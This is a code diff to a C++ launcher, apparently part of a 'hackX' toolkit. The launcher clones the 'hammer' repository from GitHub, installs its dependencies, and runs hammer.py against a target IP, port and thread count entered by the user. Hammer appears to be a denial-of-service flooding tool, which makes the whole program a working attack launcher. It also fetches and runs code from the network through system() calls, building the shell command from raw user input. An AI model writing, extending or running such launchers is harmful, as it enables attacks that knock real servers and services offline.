@@ -96,15 +96,16 @@ int main()
 		string num;
 		InstallSystem("python3");
 		InstallSystem("git");
- 		system ("git clone https://github.com/cyweb/hammer");
+ 		system ("git clone https://github.com/cyweb/hammer tmp/hammer");
  		#ifndef __linux__
- 		system ("git clone git://github.com/cyweb/hammer.git");
+ 		system ("git clone git://github.com/cyweb/hammer.git tmp/hammer");
  		#endif
-		system ("mv hammer/hammer.py ../hackX");
-		system ("mv hammer/headers.txt ../hackX");
-		system ("mv hammer/README.md ../hackX");
+		system ("cp tmp/hammer/headers.txt ../hackX");
+        
+        system ("pip3 install queuelib");
+		system ("pip install queuelib");
 		
-		system("clear");
+        system("clear");
 		
 		cout << "Please Enter IP Number:";
  		cin >> s;	
@@ -112,8 +113,8 @@ int main()
 		cin >> spam;
 		cout << "Please Enter thread Number:";
 		cin >> num;
-		str="python hammer.py -s "+s+" -p "+spam+" -t "+num;
-		str="python3 hammer.py -s "+s+" -p "+spam+" -t "+num;
+		str="python tmp/hammer/hammer.py -s "+s+" -p "+spam+" -t "+num;
+		str="python3 tmp/hammer/hammer.py -s "+s+" -p "+spam+" -t "+num;
 		
 
 
@@ -121,9 +122,6 @@ int main()
 		system (commands);
 		
 		system ("rm -rf headers.txt");
-		system ("rm -rf hammer.py");
-		system ("rm -rf README.md");
-		system ("rm -rf hammer");
 		printf ("\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
 		cout << __TIME__ << endl;
 		cout << "Bye";
